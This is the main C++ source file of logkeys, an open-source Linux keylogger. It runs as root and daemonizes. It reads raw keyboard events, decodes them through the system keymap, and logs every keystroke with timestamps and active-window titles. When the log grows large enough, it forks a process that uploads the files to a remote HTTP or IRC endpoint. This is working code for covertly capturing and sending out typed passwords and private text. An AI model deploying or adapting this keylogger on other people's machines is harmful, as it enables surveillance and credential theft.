/*
  Copyleft (ɔ) 2009 Kernc
  This program is free software. It comes with absolutely no warranty whatsoever.
  See COPYING for further information.
  
  Project homepage: https://github.com/kernc/logkeys
*/

#include <cstdio>
#include <cerrno>
#include <cwchar>
#include <vector>
#include <cstring>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <csignal>
#include <error.h>
#include <netdb.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <linux/input.h>

#ifdef HAVE_CONFIG_H
# include <config.h>  // include config produced from ./configure
#endif

#ifndef  PACKAGE_VERSION
# define PACKAGE_VERSION "0.1.2"  // if PACKAGE_VERSION wasn't defined in <config.h>
#endif

// the following path-to-executable macros should be defined in config.h;
#ifndef  EXE_PS
# define EXE_PS "/bin/ps"
#endif

#ifndef  EXE_GREP
# define EXE_GREP "/bin/grep"
#endif

#ifndef  EXE_DUMPKEYS
# define EXE_DUMPKEYS "/usr/bin/dumpkeys"
#endif

#define COMMAND_STR_DUMPKEYS ( EXE_DUMPKEYS " -n | " EXE_GREP " '^\\([[:space:]]shift[[:space:]]\\)*\\([[:space:]]altgr[[:space:]]\\)*keycode'" )
#define COMMAND_STR_GET_PID  ( (std::string(EXE_PS " ax | " EXE_GREP " '") + program_invocation_name + "' | " EXE_GREP " -v grep").c_str() )

#define COMMAND_STR_DEVICE    EXE_GREP " -E 'Handlers|EV' /proc/bus/input/devices | " EXE_GREP " -B1 120013 | " EXE_GREP " -Eo event[0-9]+"

// active window id, title, name
#define COMMAND_STR_AWID    "xprop -root 32x '\\t$0' _NET_ACTIVE_WINDOW | cut -f 2"
#define COMMAND_STR_AWTITLE "xprop -id $(" COMMAND_STR_AWID ") _NET_WM_NAME  | awk '{print $3}'"
#define COMMAND_STR_AWPNAME "xprop -id $(" COMMAND_STR_AWID ") WM_CLASS | awk '{print $4}' | sed 's:^.\\(.*\\).$:\\1:'"

#define INPUT_EVENT_PATH  "/dev/input/"  // standard path
#define DEFAULT_LOG_FILE  "/var/log/logkeys.log"
#define PID_FILE          "/var/run/logkeys.pid"

#define TIME_FORMAT "%F %T%z > "  // results in YYYY-mm-dd HH:MM:SS+ZZZZ

#include "usage.cc"      // usage() function
#include "args.cc"       // global arguments struct and arguments parsing
#include "keytables.cc"  // character and function key tables and helper functions
#include "upload.cc"     // functions concerning remote uploading of log file

namespace logkeys {

// executes cmd and returns string ouput
std::string execute(const char* cmd)
{
    FILE* pipe = popen(cmd, "r");
    if (!pipe)
      error(EXIT_FAILURE, errno, "Pipe error");
    char buffer[128];
    std::string result = "";
    while(!feof(pipe))
    	if(fgets(buffer, 128, pipe) != NULL)
    		result += buffer;
    pclose(pipe);
    return result;
}

int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it

void signal_handler(int signal)
{
  if (input_fd != -1)
    close(input_fd);  // closing input file will break the infinite while loop
}

void set_utf8_locale()
{
  // set locale to common UTF-8 for wchars to be recognized correctly
  if(setlocale(LC_CTYPE, "en_US.UTF-8") == NULL) { // if en_US.UTF-8 isn't available
    char *locale = setlocale(LC_CTYPE, "");  // try the locale that corresponds to the value of the associated environment variable LC_CTYPE
    if (locale != NULL && 
        (strstr(locale, "UTF-8") != NULL || strstr(locale, "UTF8") != NULL ||
         strstr(locale, "utf-8") != NULL || strstr(locale, "utf8") != NULL) )
      ;  // if locale has "UTF-8" in its name, it is cool to do nothing
    else
      error(EXIT_FAILURE, 0, "LC_CTYPE locale must be of UTF-8 type, or you need en_US.UTF-8 availabe");
  }
}

void exit_cleanup(int status, void *discard)
{
  // TODO:
}

void create_PID_file()
{
  // create temp file carrying PID for later retrieval
  int pid_fd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0644);
  if (pid_fd != -1) {
    char pid_str[16] = {0};
    sprintf(pid_str, "%d", getpid());
    if (write(pid_fd, pid_str, strlen(pid_str)) == -1)
      error(EXIT_FAILURE, errno, "Error writing to PID file '" PID_FILE "'");
    close(pid_fd);
  }
  else {
    if (errno == EEXIST)
         error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
    else error(EXIT_FAILURE, errno, "Error opening PID file '" PID_FILE "'");
  }
}

void kill_existing_process()
{
  pid_t pid;
  bool via_file = true;
  bool via_pipe = true;
  FILE *temp_file = fopen(PID_FILE, "r");
  
  via_file &= (temp_file != NULL);
  
  if (via_file) {  // kill process with pid obtained from PID file
    via_file &= (fscanf(temp_file, "%d", &pid) == 1);
    fclose(temp_file);
  }
  
  if (!via_file) {  // if reading PID from temp_file failed, try ps-grep pipe
    via_pipe &= (sscanf(execute(COMMAND_STR_GET_PID).c_str(), "%d", &pid) == 1);
    via_pipe &= (pid != getpid());
  }
  
  if (via_file || via_pipe) {
    remove(PID_FILE);
    kill(pid, SIGINT);

    exit(EXIT_SUCCESS);  // process killed successfully, exit
  }
  error(EXIT_FAILURE, 0, "No process killed");
}

void set_signal_handling()
{ // catch SIGHUP, SIGINT and SIGTERM signals to exit gracefully
  struct sigaction act = {{0}};
  act.sa_handler = signal_handler;
  sigaction(SIGHUP,  &act, NULL);
  sigaction(SIGINT,  &act, NULL);
  sigaction(SIGTERM, &act, NULL);
  // prevent child processes from becoming zombies
  act.sa_handler = SIG_IGN;
  sigaction(SIGCHLD, &act, NULL);
}

void determine_system_keymap()
{
  // custom map will be used; erase existing US keymapping
  memset(char_keys,  '\0', sizeof(char_keys));
  memset(shift_keys, '\0', sizeof(shift_keys));
  memset(altgr_keys, '\0', sizeof(altgr_keys));
  
  // get keymap from dumpkeys
  // if one knows of a better, more portable way to get wchar_t-s from symbolic keysym-s from `dumpkeys` or `xmodmap` or another, PLEASE LET ME KNOW! kthx
  std::stringstream ss, dump(execute(COMMAND_STR_DUMPKEYS));  // see example output after i.e. `loadkeys slovene`
  std::string line;

  unsigned int i = 0;   // keycode
  int index;
  int utf8code;      // utf-8 code of keysym answering keycode i
  
  while (std::getline(dump, line)) {
    ss.clear();
    ss.str("");
    utf8code = 0;
    
    // replace any U+#### with 0x#### for easier parsing
    index = line.find("U+", 0);
    while (static_cast<std::string::size_type>(index) != std::string::npos) {
      line[index] = '0'; line[index + 1] = 'x';
      index = line.find("U+", index);
    }
    
    if (++i >= sizeof(char_or_func)) break;  // only ever map keycodes up to 128 (currently N_KEYS_DEFINED are used)
    if (!is_char_key(i)) continue;  // only map character keys of keyboard
    
    assert(line.size() > 0);
    if (line[0] == 'k') {  // if line starts with 'keycode'
      index = to_char_keys_index(i);
      
      ss << &line[14];  // 1st keysym starts at index 14 (skip "keycode XXX = ")
      ss >> std::hex >> utf8code;
      // 0XB00CLUELESS: 0xB00 is added to some keysyms that are preceeded with '+'; I don't really know why; see `man keymaps`; `man loadkeys` says numeric keysym values aren't to be relied on, orly?
      if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00; 
      char_keys[index] = static_cast<wchar_t>(utf8code);
      
      // if there is a second keysym column, assume it is a shift column
      if (ss >> std::hex >> utf8code) {
        if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
        shift_keys[index] = static_cast<wchar_t>(utf8code);
      }
      
      // if there is a third keysym column, assume it is an altgr column
      if (ss >> std::hex >> utf8code) {
        if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
        altgr_keys[index] = static_cast<wchar_t>(utf8code);
      }
      
      continue;
    }
    
    // else if line starts with 'shift i'
    index = to_char_keys_index(--i);
    ss << &line[21];  // 1st keysym starts at index 21 (skip "\tshift\tkeycode XXX = " or "\taltgr\tkeycode XXX = ")
    ss >> std::hex >> utf8code;
    if (line[21] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;  // see line 0XB00CLUELESS
    
    if (line[1] == 's')  // if line starts with "shift"
      shift_keys[index] = static_cast<wchar_t>(utf8code);
    if (line[1] == 'a')  // if line starts with "altgr"
      altgr_keys[index] = static_cast<wchar_t>(utf8code);
  } // while (getline(dump, line))
}


void parse_input_keymap()
{
  // custom map will be used; erase existing US keytables
  memset(char_keys,  '\0', sizeof(char_keys));
  memset(shift_keys, '\0', sizeof(shift_keys));
  memset(altgr_keys, '\0', sizeof(altgr_keys));
  
  stdin = freopen(args.keymap.c_str(), "r", stdin);
  if (stdin == NULL)
    error(EXIT_FAILURE, errno, "Error opening input keymap '%s'", args.keymap.c_str());
  
  unsigned int i = -1;
  unsigned int line_number = 0;
  wchar_t func_string[32];
  wchar_t line[32];
  
  while (!feof(stdin)) {
    
    if (++i >= sizeof(char_or_func)) break;  // only ever read up to 128 keycode bindings (currently N_KEYS_DEFINED are used)
    
    if (is_used_key(i)) {
      ++line_number;
      if(fgetws(line, sizeof(line), stdin) == NULL) {
        if (feof(stdin)) break;
        else error_at_line(EXIT_FAILURE, errno, args.keymap.c_str(), line_number, "fgets() error");
      }
      // line at most 8 characters wide (func lines are "1234567\n", char lines are "1 2 3\n")
      if (wcslen(line) > 8) // TODO: replace 8*2 with 8 and wcslen()!
        error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "Line too long!");
      // terminate line before any \r or \n
      std::wstring::size_type last = std::wstring(line).find_last_not_of(L"\r\n");
      if (last == std::wstring::npos)
        error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "No characters on line");
      line[last + 1] = '\0';
    }
    
    if (is_char_key(i)) {
      unsigned int index = to_char_keys_index(i);
      if (swscanf(line, L"%lc %lc %lc", &char_keys[index], &shift_keys[index], &altgr_keys[index]) < 1) {
        error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "Too few input characters on line");
      }
    }
    if (is_func_key(i)) {
      if (i == KEY_SPACE) continue;  // space causes empty string and trouble
      if (swscanf(line, L"%7ls", &func_string[0]) != 1)
        error_at_line(EXIT_FAILURE, 0, args.keymap.c_str(), line_number, "Invalid function key string");  // does this ever happen?
      wcscpy(func_keys[to_func_keys_index(i)], func_string);
    }
  } // while (!feof(stdin))
  fclose(stdin);
  
  if (line_number < N_KEYS_DEFINED)
#define QUOTE(x) #x  // quotes x so it can be used as (char*)
    error(EXIT_FAILURE, 0, "Too few lines in input keymap '%s'; There should be " QUOTE(N_KEYS_DEFINED) " lines!", args.keymap.c_str());
}

void export_keymap_to_file()
{
  int keymap_fd = open(args.keymap.c_str(), O_CREAT | O_EXCL | O_WRONLY, 0644);
  if (keymap_fd == -1)
    error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.keymap.c_str());
  char buffer[32];
  int buflen = 0;
  unsigned int index;
  for (unsigned int i = 0; i < sizeof(char_or_func); ++i) {
    buflen = 0;
    if (is_char_key(i)) {
      index = to_char_keys_index(i);
      // only export non-null characters
      if (char_keys[index]  != L'\0' && 
          shift_keys[index] != L'\0' && 
          altgr_keys[index] != L'\0')
        buflen = sprintf(buffer, "%lc %lc %lc\n", char_keys[index], shift_keys[index], altgr_keys[index]);
      else if (char_keys[index]  != L'\0' && 
               shift_keys[index] != L'\0')
        buflen = sprintf(buffer, "%lc %lc\n", char_keys[index], shift_keys[index]);
      else if (char_keys[index] != L'\0')
        buflen = sprintf(buffer, "%lc\n", char_keys[index]);
      else  // if all \0, export nothing on that line (=keymap will not parse)
        buflen = sprintf(buffer, "\n");
    }
    else if (is_func_key(i)) {
      buflen = sprintf(buffer, "%ls\n", func_keys[to_func_keys_index(i)]);
    }
    
    if (is_used_key(i))
      if (write(keymap_fd, buffer, buflen) < buflen)
        error(EXIT_FAILURE, errno, "Error writing to keymap file '%s'", args.keymap.c_str());
  }
  close(keymap_fd);
  error(EXIT_SUCCESS, 0, "Success writing keymap to file '%s'", args.keymap.c_str());
  exit(EXIT_SUCCESS);
}

void determine_input_device()
{
  // better be safe than sory: while running other programs, switch user to nobody
  setegid(65534); seteuid(65534);
  
  // extract input number from /proc/bus/input/devices (I don't know how to do it better. If you have an idea, please let me know.)
  // The compiler automatically concatenates these adjacent strings to a single string.
  const char* cmd = COMMAND_STR_DEVICE;
  std::stringstream output(execute(cmd));
  
  std::vector<std::string> results;
  std::string line;
  
  while(std::getline(output, line)) {
    std::string::size_type i = line.find("event");
    if (i != std::string::npos) i += 5; // "event".size() == 5
    if (i < line.size()) {
      int index = atoi(&line.c_str()[i]);
      
      if (index != -1) {
        std::stringstream input_dev_path;
        input_dev_path << INPUT_EVENT_PATH;
        input_dev_path << "event";
        input_dev_path << index;

        results.push_back(input_dev_path.str());
      }
    }
  }
  
  if (results.size() == 0) {
    error(0, 0, "Couldn't determine keyboard device. :/");
    error(EXIT_FAILURE, 0, "Please post contents of your /proc/bus/input/devices file as a new bug report. Thanks!");
  }

  args.device = results[0];  // for now, use only the first found device
  
  // now we reclaim those root privileges
  seteuid(0); setegid(0);
}

// write newline then add timestamp and programinfo
////event is wrong use refercen or pointer
inline int newline(FILE *& out, struct input_event event, bool program_changed, std::string program_info) {
  char timestamp[32];
  int inc_size = fprintf(out, "\n");

  if (!(args.flags & FLAG_NO_TIMESTAMPS)) {
    strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&event.time.tv_sec));
    inc_size += fprintf(out, "%s", timestamp);
  }
  if (program_changed)
    inc_size += fprintf(out, "%s", program_info.c_str());

  return inc_size;
}

inline int encode_char(FILE *& out, unsigned int scan_code, bool altgr_in_effect, bool shift_in_effect) {
  int inc_size = 0;
  if (is_char_key(scan_code)) {
    wchar_t wch;
    if (altgr_in_effect) {
      wch = altgr_keys[to_char_keys_index(scan_code)];
      if (wch == L'\0') {
        if(shift_in_effect)
          wch = shift_keys[to_char_keys_index(scan_code)];
        else
          wch = char_keys[to_char_keys_index(scan_code)];
      }
    } 
    else if (shift_in_effect) {
      wch = shift_keys[to_char_keys_index(scan_code)];
      if (wch == L'\0')
        wch = char_keys[to_char_keys_index(scan_code)];
    }
    else  // neither altgr nor shift are effective, this is a normal char
      wch = char_keys[to_char_keys_index(scan_code)];
    
    if (wch != L'\0') 
    inc_size += fprintf(out, "%lc", wch);  // write character to log file
  }
  else if (is_func_key(scan_code)) {
    if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
      inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
    } 
    else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
      inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
    }
  }
  else 
    inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
  
  return inc_size;
}

int main(int argc, char **argv)
{  
  on_exit(exit_cleanup, NULL);
  
  if (geteuid()) error(EXIT_FAILURE, errno, "Got r00t?");

  args.logfile = (char*) DEFAULT_LOG_FILE;  // default log file will be used if none specified
  
  process_command_line_arguments(argc, argv);
  
  // kill existing logkeys process
  if (args.kill) kill_existing_process();
  
  // if neither start nor export, that must be an error
  if (!args.start && !(args.flags & FLAG_EXPORT_KEYMAP)) { usage(); exit(EXIT_FAILURE); }
  
  // if posting remote and post_size not set, set post_size to default [500K bytes]
  if (args.post_size == 0 && (!args.http_url.empty() || !args.irc_server.empty())) {
    args.post_size = 500000;
  }
  
  // check for incompatible flags
  if (!args.keymap.empty() && (!(args.flags & FLAG_EXPORT_KEYMAP) && args.us_keymap)) {  // exporting uses args.keymap also
    error(EXIT_FAILURE, 0, "Incompatible flags '-m' and '-u'. See usage.");
  }
  
  set_utf8_locale();
  
  if (args.flags & FLAG_EXPORT_KEYMAP) {
    if (!args.us_keymap) 
      determine_system_keymap();
    export_keymap_to_file();
    // = exit(0)
  }
  else if (!args.keymap.empty())  // custom keymap in use
    parse_input_keymap();
  else
    determine_system_keymap();
  
  if (args.device.empty()) {  // no device given with -d switch
    determine_input_device();
  } 
  else {  // event device supplied as -d argument
    std::string::size_type i = args.device.find_last_of('/');
    args.device = (std::string(INPUT_EVENT_PATH) + args.device.substr(i == std::string::npos ? 0 : i + 1));
  }
  
  set_signal_handling();
  
  int nochdir = 0;
  if (args.logfile[0] != '/')
       nochdir = 1;  // don't chdir (logfile specified with relative path)
  int noclose = 1;  // don't close streams (stderr used)
  if (daemon(nochdir, noclose) == -1)  // become daemon
    error(EXIT_FAILURE, errno, "Failed to become daemon");
  close(STDIN_FILENO); close(STDOUT_FILENO);  // leave stderr open
  
  // open input device for reading
  input_fd = open(args.device.c_str(), O_RDONLY);
  if (input_fd == -1) {
    error(EXIT_FAILURE, errno, "Error opening input event device '%s'", args.device.c_str());
  }
  
  // if log file is other than default, then better seteuid() to the getuid() in order to ensure user can't write to where she shouldn't!
  if (args.logfile == DEFAULT_LOG_FILE) {
    seteuid(getuid());
    setegid(getgid());
  }
  
  // open log file (if file doesn't exist, create it with safe 0600 permissions)
  umask(0177);
  FILE *out = fopen(args.logfile.c_str(), "a");
  if (!out)
    error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
  
  // now we need those privileges back in order to create system-wide PID_FILE
  seteuid(0); setegid(0);
  create_PID_file();
  
  // now we've got everything we need, finally drop privileges by becoming 'nobody'
  //setegid(65534); seteuid(65534);   // commented-out, I forgot why xD
  
  unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
  struct input_event event;
  char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
  bool shift_in_effect = false;
  bool altgr_in_effect = false;
  bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
  int count_repeats = 0;  // count_repeats differs from the actual number of repeated characters! afaik, only the OS knows how these two values are related (by respecting configured repeat speed and delay)
  
  struct stat st;
  stat(args.logfile.c_str(), &st);
  off_t file_size = st.st_size;  // log file is currently file_size bytes "big"
  int inc_size;  // is added to file_size in each iteration of keypress reading, adding number of bytes written to log file in that iteration
  
  time_t cur_time;
  time(&cur_time);
  strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
  
  if (args.flags & FLAG_NO_TIMESTAMPS)
    file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
  else
    file_size += fprintf(out, "Logging started ...\n\n");
  
  fflush(out);

  //// programinfo
  std::string window_id;
  std::string old_window_id;
  std::string cur_process_name; 
  std::string cur_window_name;
  std::string program_info;
  bool program_changed = false;
  
  // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
  while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
    
// these event.value-s aren't defined in <linux/input.h> ?
#define EV_MAKE   1  // when key pressed
#define EV_BREAK  0  // when key released
#define EV_REPEAT 2  // when key switches to repeating after short delay
    
    if (event.type != EV_KEY) continue;  // keyboard events are always of type EV_KEY
    
    inc_size = 0;
    scan_code = event.code;
    
    if (scan_code >= sizeof(char_or_func)) {  // keycode out of range, log error
      inc_size += fprintf(out, "<E-%x>", scan_code);
      if (inc_size > 0) file_size += inc_size;
      continue;
    }

    //// on processid change update program_info write '[process name] "process title" > '
    //// on process title change (like firefox tabs) would be better. possibly more ressource intensive?
    if (args.flags & FLAG_PROGRAMINFO) {
      window_id = execute(COMMAND_STR_AWID);
      
      if (window_id.compare(old_window_id) != 0) {
        cur_process_name = execute(COMMAND_STR_AWPNAME);
        cur_window_name = execute(COMMAND_STR_AWTITLE);
        program_info = "[" + cur_process_name.erase(cur_process_name.size() - 1) + "] " + cur_window_name.erase(cur_window_name.size() - 1) + " > "; // delete newline (why are newlines)
        program_changed = true;
      }
    }

    // if remote posting is enabled and size treshold is reached
    if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
      fclose(out);
      
      std::stringstream ss;
      for (int i = 1;; ++i) {
        ss.clear();
        ss.str("");
        ss << args.logfile << "." << i;
        if (stat(ss.str().c_str(), &st) == -1) break;  // file .log.i doesn't yet exist
      }
      
      if (rename(args.logfile.c_str(), ss.str().c_str()) == -1)  // move current log file to indexed
        error(EXIT_FAILURE, errno, "Error renaming logfile");
      
      out = fopen(args.logfile.c_str(), "a");  // open empty log file with the same name
      if (!out)
        error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
      
      file_size = 0;  // new log file is now empty
      
      // write new timestamp
      time(&cur_time);
      strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
      if (args.flags & FLAG_NO_TIMESTAMPS)
        file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
      else
        file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
      
      if (!args.http_url.empty() || !args.irc_server.empty()) {
        switch (fork()) {
        case -1: error(0, errno, "Error while forking remote-posting process");
        case 0:  
          start_remote_upload();  // child process will upload the .log.i files
          exit(EXIT_SUCCESS);
        }
      }
    }

    ////possible conflict if key repeated and program changed???

    // on key repeat ; must check before on key press
    if (event.value == EV_REPEAT) {
      ++count_repeats;
    } else if (count_repeats) {
      if (prev_code == KEY_RIGHTSHIFT || prev_code == KEY_LEFTCTRL || 
          prev_code == KEY_RIGHTALT   || prev_code == KEY_LEFTALT  || 
          prev_code == KEY_LEFTSHIFT  || prev_code == KEY_RIGHTCTRL);  // if repeated key is modifier, do nothing
      else {
        if ((args.flags & FLAG_NO_FUNC_KEYS) && is_func_key(prev_code));  // if repeated was function key, and if we don't log function keys, then don't log repeat either
        else inc_size += fprintf(out, "<#+%d>", count_repeats);
      }
      count_repeats = 0;  // reset count for future use
    }

    // on key press
    if (event.value == EV_MAKE) {
      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp and programinfo
      if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER) {
        inc_size += newline(out, event, program_changed, program_info);
      }
      else if (program_changed || (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
        inc_size += newline(out, event, program_changed, program_info);
        inc_size += encode_char(out, scan_code, altgr_in_effect, shift_in_effect);
      }
      else { // normal char
        if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
          shift_in_effect = true;
        if (scan_code == KEY_RIGHTALT)
          altgr_in_effect = true;
        if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
          ctrl_in_effect = true;

        inc_size += encode_char(out, scan_code, altgr_in_effect, shift_in_effect); // print character or string coresponding to received keycode; only print chars when not \0
      }
    } // if (EV_MAKE)
    
    // on key release
    if (event.value == EV_BREAK) {
      if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
        shift_in_effect = false;
      if (scan_code == KEY_RIGHTALT)
        altgr_in_effect = false;
      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
        ctrl_in_effect = false;
    }

    // update program id
    if (args.flags & FLAG_PROGRAMINFO) { 
      old_window_id = window_id;
      program_changed = false;
    }
    
    prev_code = scan_code;
    fflush(out);
    if (inc_size > 0) 
      file_size += inc_size;
    
  } // while (read(input_fd))
  
  // append final timestamp, close files and exit
  time(&cur_time);
  strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
  fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
  
  fclose(out);
  
  remove(PID_FILE);
  
  exit(EXIT_SUCCESS);
} // main()

} // namespace logkeys

int main(int argc, char** argv)
{
  return logkeys::main(argc, argv);
}

